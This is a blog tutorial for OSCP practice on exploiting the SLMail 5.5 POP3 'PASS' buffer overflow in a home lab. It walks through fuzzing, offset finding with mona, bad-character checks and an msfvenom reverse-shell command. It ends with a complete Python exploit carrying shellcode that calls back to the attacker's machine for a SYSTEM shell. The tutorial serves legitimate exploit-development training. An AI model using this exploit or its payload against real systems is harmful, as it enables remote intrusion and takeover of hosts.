---
title: "Intro to Buffer Overflows"
date: 2020-02-16T11:46:59-08:00
draft: false
categories:
- Offsec
tags:
- Offensive Security
- OSCP
- Buffer Overflows
- Pentesting
keywords:
- security
coverImage: /images/Offsec/BufferOverflow/banner.png
autoThumbnailImage: false
coverSize: partial
coverMeta: in
#thumbnailImage:
---

SLMail is an awesome choice of software to easily practice creating and exploiting buffer overflows. If you need to practice Buffer Overflows for your OSCP, then hopefully this tutorial can help you.
<!--more-->

<!--toc-->

<hr>

## Setup

<hr>

This is my current setup:

* Mac OSX 10.15.3
* Windows 7 SP1 VM (Updated on Feb 17, _yes I know EOL_)
* Kali 2019.3 VM (I forgot to update to 2020.1)
* VMWare Fusion 11.5.1

In the Windows 7 VM, install the following:

* [Immunity Debugger](https://www.immunityinc.com/products/debugger/)
* [mona.py](https://github.com/corelan/mona)
* SLMail 5.5 - You can download the software directly from [Exploit-DB](https://www.exploit-db.com/exploits/638)

Make sure you update your Windows 7 box. I ran into so many issues because of this. Update, get it out of the way, then continue with the software installs. Once that is complete, install and open Immunity to make sure everything is running properly. With SLMail, just hit next on every prompt and accept all the defaults. With mona, just move the mona.py script over to `C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands` folder.

The last two things you should do is switch the networking adapter to Local Only, and turn off the Windows Firewall.

<hr>

## Establishing Connectivity

<hr>

From my main host (Mac OSX - IP is 192.168.60.1), I'll establish a connection to SLMail which is running on port 110. `nc -v 192.168.60.128 110`
![Establishing Connectivity](/images/Offsec/BufferOverflow/one.png)

Let's start. Create a basic python script to help us automate the connection process. This template code is what we will be tweaking to eventually create our final exploit.
{{< tabbed-codeblock "poc.py" >}}
<!-- tab python-->

#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    print"\nConnecting..."
    s.connect(('192.168.60.128', 110))
    data = s.recv(1024)
    s.send('USER username ' + '\r\n')
    data = s.recv(1024)
    s.send('PASS password ' + '\r\n')
    data = s.recv(1024)
    s.close()
    print"\nDone!"
except:
    print "Could not connect to POP3..."
<!-- endtab -->
{{< /tabbed-codeblock >}}

Don't forget to make it executable and run it.
![Establishing Connectivity with our python script](/images/Offsec/BufferOverflow/two.png)

<hr>

## Fuzzing

<hr>

Now onto the next step. We will now starting _fuzzing_ the application. Fuzzing is the process in which we throw random or unexpected data to the application in an attempt to crash it. Although you can use different tools and techniques for this process, for now we will simply throw _about 2000_ A's (x41 in Hexadecimal) to SLMail. Also in the real world, don't expect to find something right away. Fuzzing is an art and it can take a long time to find something, if anything at all. With SLMail, the title of the Exploit-DB page kinda gives away the vulnerable parameter _"Seattle Lab Mail (SLmail) 5.5 - POP3 'PASS' Remote Buffer Overflow"_, giving us the correct path to take.

So now, instead of sending the "password" in the PASS parameter, we will modify our exploit template to send the 2000 A's instead.

{{< tabbed-codeblock "poc.py" >}}
<!-- tab python-->

#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "\x41" * 2000

try:
    print"\nConnecting..."
    s.connect(('192.168.60.128', 110))
    data = s.recv(1024)
    s.send('USER username ' + '\r\n')
    data = s.recv(1024)
    s.send('PASS '+ buffer + '\r\n')
    data = s.recv(1024)
    s.close()
    print"\nDone!"
except:
    print "Could not connect to POP3..."
<!-- endtab -->
{{< /tabbed-codeblock >}}

Now let's open Immunity to start the debug process. Since SLMail is running as Administrator, we will have to do the same with Immunity. Right click on the desktop icon, click on _"Run as administrator"_, accept the UAC prompt, and now attach the SLmail.exe process under _File > Attach_. Once it attaches, it will pause the process so hit _F9_ or _Debug > Run_ to resume SLMail.

![Attaching SLMail Process](/images/Offsec/BufferOverflow/three.png)

Make your modifications to the exploit template and launch your script. If you sent the 2000 A's, the app won't crash. The reason for this is that the exact size of the buffer that holds the PASS variable is unbeknownst to us, so we will have to keep throwing more A's at SLMail until it crashes. Increase it to 3000 and run it again. This time, it will crash. We know it has crashed because the EIP register will be filled with 41's and it will say "Paused" in the bottom right hand corner.

![Crashing the App](/images/Offsec/BufferOverflow/four.png)

Why did SLMail crash/seg-fault? Well, since we threw in 3000 A's into the buffer, it was more data than what the buffer could hold and the program itself didn't have any exceptions to catch this. In turn, it also changed the EIP (instruction pointer) which is what the CPU uses to point to the next instruction. Since 41414141 is not a valid address to an instruction, the application crashes.

Sweet. Now we know that our buffer size is somewhere between 2000 and 3000 bytes. Let's restart the app and try some mona tricks to find that exact amount.

*NOTE: I could not figure out how to restart the app manually so for the time being, I would just bounce (restart) the VM and relaunch Immunity.*

<hr>

## Pattern Creation with Mona

<hr>

With Mona, if you ever need the help menu, just type: `!mona help`
![Working with Mona](/images/Offsec/BufferOverflow/five.png)

Before anything, let's get our working folder setup. Create a new folder under the C drive as `C:\BufferOverflow\` then run the following command: `!mona config -set workingfolder C:\BufferOverflow\%p`. This make all the output from mona appear in that folder. The `%p` tells mona to create a new sub-folder named after the current application that is being debugged.

Now run: `!mona pc 3000` or `!mona pattern_create 3000`

After we run that command, there will be a new file called `pattern.txt`. This creates a unique ASCII string that is 3000 bytes in size. Copy the ASCII chars from that file into the poc code and set that as the buffer you pass into the 'PASS' parameter.

{{< tabbed-codeblock "poc.py" >}}
<!-- tab python-->
#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "\x41" * 3000

pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9"

try:
    print"\nConnecting..."
    s.connect(('192.168.60.128', 110))
    data = s.recv(1024)
    s.send('USER username ' + '\r\n')
    data = s.recv(1024)
    s.send('PASS '+ pattern + '\r\n')
    data = s.recv(1024)
    s.close()
    print"\nDone!"
except:
    print "Could not connect to POP3..."
<!-- endtab -->
{{< /tabbed-codeblock >}}

Now run the poc code. As before, the application should crash, but this time we will have a new value in the EIP register. In this case, the resulting value is `39694438`.
![EIP Value](/images/Offsec/BufferOverflow/six.png)

Now let's use mona to find the pattern offset. There are two commands you can use: `!mona pattern_offset 0x39694438` which results in:
![EIP Value - Pattern_Offset](/images/Offsec/BufferOverflow/seven.png)

Or do `!mona findmsp`:
![EIP Value - findmsp](/images/Offsec/BufferOverflow/eight.png)

Voila! `2606 bytes` is the size of the buffer. Another useful tip to know, which will come in handy later, is that the ESP (stack pointer) is at 2610 bytes. Why is this important well...

<hr>

## The Importance of Controlling Registers.

<hr>

A quick review first.

EIP - It is the instruction pointer. It holds the address of the first byte of the next instruction to be executed.

ESP - It is the stack pointer. It holds the address of the most-recently pushed value on the stack.

Shellcode - Machine code or assembly instructions put into hex that tell the host to do whatever you want. Its typically called <i>shell</i>code because it will spawn a shell. There are typically two kinds of shells, reverse shells and bind shells. In a bindshell, it means that the host is binding the network interface to a port of your choosing, or the shell is listening locally. In a reverse shell, the host starts the egress network connection _back_ to your machine, where you would be listening for that connection to come in. [Wikipedia - Shellcode](https://en.wikipedia.org/wiki/Shellcode)

Well, we know exactly where the program crashes and we have full control over the contents in the registers. Why is this useful? Well, _what if_ we were to push some shellcode onto the stack, and _what if_ we were to put a legitimate address into the EIP register that, lets say, contained the instruction to jump over to the address held the stack pointer and run our beautiful shellcode? Too confusing? In other words, we are now telling the application to stop it's normal execution and run _our_ own code.

This is one of the reasons why we have to be so precise. We have to send the maximum length of bytes to the PASS parameter, 4 bytes for the EIP address (_which again, is the instruction to jump to the ESP register_), a small NOP sled (_we will cover that soon_), and our shellcode after 2610 bytes.

Now that we have that bit of information, let's continue.

<hr>

## Finding a JMP ESP Instruction

<hr>

The next thing we have to do is find a JMP ESP instruction. Mona facilitates this process.

You can do: `!mona jmp -r ESP` but this gives us no result.
![Mona - Find JMP ESP](/images/Offsec/BufferOverflow/nine.png)

Or you can do: `!mona modules`, find a DLL that has little to no buffer overflow protections.
![Mona - Find a Vulnerable DLL](/images/Offsec/BufferOverflow/nineA.png)
then do: `!mona find -s "\xff\xe4" -m SLMFC.DLL`. FFE4 is the machine code for the __JMP ESP__ instruction and SLMFC is a DLL that is part of the SLMail program.
![Mona - Find a JMP Instruction](/images/Offsec/BufferOverflow/nineB.png)

And this does give us a result. `0x5F4A358F` is an address in the DLL that contains the JMP ESP instruction. Convert it to little endian like so: `\x8F\x35\x4A\x5F` and add that to the poc code after our 2606 "\x41"'s. _In the screenshot above, look at the first entry under the [+] Results :_

<hr>

## Finding the Bad Chars

<hr>

The next step before we generate our shellcode is to find all the bad characters. These are chars that will make our shellcode stop working. To do this, you can use mona to generate an array of bytes starting from 0x00 and ending in 0xFF: `!mona bytearray`

Go into the newly created file in our working folder and copy the array into your poc code. Don't copy from the log window itself. You can remove `0x0A` and `0x0D`. These are the newline and carriage return hex values. These typically are caught as bad chars. I personally also remove `0x00` as this is the null char.

{{< tabbed-codeblock "poc.py" >}}
<!-- tab python-->
#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "\x41" * 3000
buffer2 = "\x41" * 2606 #Pattern_Offset found buffer size at 2605
address = "\x8F\x35\x4A\x5F" #JMP ESP is at 0x5F4A358F in SLMFC.DLL

#Bad chars are: 0x00, 0x0A, 0x0D
shellcode = ""

ba = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
ba += "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
ba += "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
ba += "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
ba += "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
ba += "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
ba += "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
ba += "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

exploit = buffer2 + address + ba

try:
    print"\nConnecting..."
    s.connect(('192.168.60.128', 110))
    data = s.recv(1024)
    s.send('USER username ' + '\r\n')
    data = s.recv(1024)
    s.send('PASS '+ exploit + '\r\n')
    data = s.recv(1024)
    s.close()
    print"\nDone!"
except:
    print "Could not connect to POP3..."

<!-- endtab -->
{{< /tabbed-codeblock >}}
From here there are two things you can do to the find the bad characters, the manual way or the automatic way. I personally like the manual way since it forces me to look at the memory dump and look for the bad chars.

<hr>

### Manual Way:

<hr>

Once the application crashes, right click on the ESP register and click on _Follow in Dump_.
![Follow in Dump](/images/Offsec/BufferOverflow/ten.png)

In the bottom-left hand section, you'll see the byte array we threw along after our 2606 A's and JMP ESP address.
![Looking at the Dump](/images/Offsec/BufferOverflow/tenA.png)

Notice that every character between `0x01` and `0xFF` is there. Of course, we did remove `0x00`, `0x0A`, and `0x0D`. How do we know if we _did_ have another bad character? For example, if 0xC2 was bad char, then everything after 0xC2 would be randomized and not look like the original array that we started with. You might also see random null (0x00) chars scattered across the dump as well. With that being said, it seems that there are no new bad chars.  

If we did have any bad chars, we would simply remove them from our poc code, re-run the exploit, and repeat this process until we didn't have any remaining bad chars.

<hr>

### Automatic Way:

<hr>

Run the following command once the application crashes: `!mona compare -f c:\Users\Rafa\Desktop\bytearray.bin -a 0x0190A128` where `0x0190A128` is the current address in the ESP register.
![Looking at the Dump](/images/Offsec/BufferOverflow/tenB.png)

If mona finds any bad chars, create a new byte array with mona: `!mona bytearray -cpb \x00\x0a\x0d`. Then copy the new byte array into your poc code, re-run the exploit, and repeat this process until we didn't have any remaining bad chars.

<hr>

## Generating Shellcode

<hr>

For this next step, we will be using MSFVenom to generate some shellcode for us. Open up your Kali Box and type `msfvenom`.

We need to generate a reverse shell windows 7 payload that does not include any of the found bad chars. To do that, type the following command:
`root@kali:~# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.60.1 LPORT=443 -f python -b "\x00\x0a\x0d" -o shellcode`
![MSFVenom](/images/Offsec/BufferOverflow/elev.png)

Here's what the flags do:

* -p - Sets the payload. In this case, its a windows reverse tcp shell.
* -f - Sets what the output format should be. In this case, its python.
* -b - Sets what the bad characters are.
* -o - Sets the name of the output file.
* \-\-platform - Your target platform.
* LHOST= - Your ip of your local machine. AKA, where you would want to receive the incoming shell.
* LPORT= - The port where that shell will come into.
* -a - Sets the architecture, either 32-bit(x86) or 64-bit(x64).
* -e - Sets the encoder. Tries to encode the data so its not so easily caught by AV products. If you don't include this, it will pick the best one for you, if possible.

<hr>

## NOP Sled

<hr>

One last thing. We are almost done writing our poc exploit code. We just need to include a small NOP sled right after our jmp esp address but before the shellcode. Why? Because we can use the NOP sled to make the target address _"bigger"_. A NOP instruction `\x90` simply does absolutely nothing. That means that the jump can land anywhere in the NOP instruction set instead of landing exactly at the beginning of the shellcode. With the NOP sled, the execution will skip until it lands at the beginning of the shellcode. Let's add 16 bytes of NOPS. Coded, this is what it would look like: `NOP = "\x90" * 16`

> The NOP slide, or NOP sled, is a simple technique to cope with accuracy issue. When the attacker guesses the address of his shell code with some possible jitter, then the attacker puts a lot of nop opcodes (or similarly harmless opcodes) before his shell code; thus, it suffices that the CPU jumps somewhere in the sled in order to make it, ultimately, reach the shell code. - __Redacted from [Stack Overflow](https://security.stackexchange.com/questions/40298/stack-buffer-overflow-confusion)__

<hr>

## Putting it All Together

<hr>

The JMP ESP instruction address was `0x5F4A358F`. As mentioned before, in order for this to work, it needs to put it in little endian, or in reverse order. The end result will look like this: `\x8F\x35\x4A\x5F`

Now copy the shellcode into your poc code. Don't forget to add the NOP instructions and the JMP ESP instruction address in little endian.

{{< tabbed-codeblock "poc.py" >}}
<!-- tab python-->
#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "\x41" * 2606 #Pattern_Offset found buffer size at 2605
address = "\x8F\x35\x4A\x5F" #JMP ESP is at 0x5F4A358F in SLMFC.DLL
NOP = "\x90" * 16

#Bad chars are: 0x00, 0x0A, 0x0D
buf =  ""
buf += "\xdb\xc7\xba\x3a\xae\x24\x12\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x52\x31\x50\x17\x03\x50\x17\x83\xfa\xaa\xc6"
buf += "\xe7\x06\x5a\x84\x08\xf6\x9b\xe9\x81\x13\xaa\x29\xf5"
buf += "\x50\x9d\x99\x7d\x34\x12\x51\xd3\xac\xa1\x17\xfc\xc3"
buf += "\x02\x9d\xda\xea\x93\x8e\x1f\x6d\x10\xcd\x73\x4d\x29"
buf += "\x1e\x86\x8c\x6e\x43\x6b\xdc\x27\x0f\xde\xf0\x4c\x45"
buf += "\xe3\x7b\x1e\x4b\x63\x98\xd7\x6a\x42\x0f\x63\x35\x44"
buf += "\xae\xa0\x4d\xcd\xa8\xa5\x68\x87\x43\x1d\x06\x16\x85"
buf += "\x6f\xe7\xb5\xe8\x5f\x1a\xc7\x2d\x67\xc5\xb2\x47\x9b"
buf += "\x78\xc5\x9c\xe1\xa6\x40\x06\x41\x2c\xf2\xe2\x73\xe1"
buf += "\x65\x61\x7f\x4e\xe1\x2d\x9c\x51\x26\x46\x98\xda\xc9"
buf += "\x88\x28\x98\xed\x0c\x70\x7a\x8f\x15\xdc\x2d\xb0\x45"
buf += "\xbf\x92\x14\x0e\x52\xc6\x24\x4d\x3b\x2b\x05\x6d\xbb"
buf += "\x23\x1e\x1e\x89\xec\xb4\x88\xa1\x65\x13\x4f\xc5\x5f"
buf += "\xe3\xdf\x38\x60\x14\xf6\xfe\x34\x44\x60\xd6\x34\x0f"
buf += "\x70\xd7\xe0\x80\x20\x77\x5b\x61\x90\x37\x0b\x09\xfa"
buf += "\xb7\x74\x29\x05\x12\x1d\xc0\xfc\xf5\xe2\xbd\xc2\x04"
buf += "\x8b\xbf\x3a\x06\xf0\x49\xdc\x62\x16\x1c\x77\x1b\x8f"
buf += "\x05\x03\xba\x50\x90\x6e\xfc\xdb\x17\x8f\xb3\x2b\x5d"
buf += "\x83\x24\xdc\x28\xf9\xe3\xe3\x86\x95\x68\x71\x4d\x65"
buf += "\xe6\x6a\xda\x32\xaf\x5d\x13\xd6\x5d\xc7\x8d\xc4\x9f"
buf += "\x91\xf6\x4c\x44\x62\xf8\x4d\x09\xde\xde\x5d\xd7\xdf"
buf += "\x5a\x09\x87\x89\x34\xe7\x61\x60\xf7\x51\x38\xdf\x51"
buf += "\x35\xbd\x13\x62\x43\xc2\x79\x14\xab\x73\xd4\x61\xd4"
buf += "\xbc\xb0\x65\xad\xa0\x20\x89\x64\x61\x50\xc0\x24\xc0"
buf += "\xf9\x8d\xbd\x50\x64\x2e\x68\x96\x91\xad\x98\x67\x66"
buf += "\xad\xe9\x62\x22\x69\x02\x1f\x3b\x1c\x24\x8c\x3c\x35"

exploit = buffer + address + NOP + buf

try:
    print"\nConnecting..."
    s.connect(('192.168.60.128', 110))
    data = s.recv(1024)
    s.send('USER username ' + '\r\n')
    data = s.recv(1024)
    s.send('PASS '+ exploit + '\r\n')
    data = s.recv(1024)
    s.close()
    print"\nDone!"
except:
    print "Could not connect to POP3..."

<!-- endtab -->
{{< /tabbed-codeblock >}}

<hr>

## It's Raining Shells.

<hr>

Start a local netcat listener on the port we specified in our shellcode: `nc -lvnp 443` and execute the poc.py script. If you did everything correctly, you should get a shell. A simple `whoami` shows us that our shell is running as System! Since I am running netcat on Mac OSX, the netcat command will be a little different for me: `nc -l 443` but the end result is always the same.
![Reverse Shell](/images/Offsec/BufferOverflow/twelv.png)

That's pretty much it for now. Once you receive your reverse shell, you can celebrate. Go pick another vulnerable software on Exploit-DB and keep on practicing! And as always, feedback is greatly appreciated.

<hr>
<hr>

## References


* [Wikipedia - Shellcode](https://en.wikipedia.org/wiki/Shellcode)
* [Wikipedia - NOP Slide](https://en.wikipedia.org/wiki/NOP_slide)
* [Exploit-DB - SLMail 5.5 Exploit](https://www.exploit-db.com/exploits/638)
* [cvedetails - CVE-2003-0264](https://www.cvedetails.com/cve/cve-2003-0264)
* [Another Writeup](https://windowsexploit.com/blog/2016/12/29/windows-exploit-slmail)
* [Yet Another Writeup](http://www.hugohirsh.com/?p=509)
* [Yet Yet Another Writeup](https://zero-day.io/buffer-overflow-introduction/)

## Mona Cheatsheet

A quick mona reference:

  * Set the working folder: `!mona config -set workingfolder C:\BufferOverflow\%p`
  * Create a pattern : `!mona pc 3000`
  * Find the patter offset: `!mona pattern_offset 0xSOMEVALUE`
  * Create a byte array to find bad chars: `!mona bytearray` or `!mona findmsp`
  * Find a JMP ESP instruction: `!mona modules` & `!mona find -s "\xff\xe4" -m SOME.DLL` or `!mona JMP -r ESP`
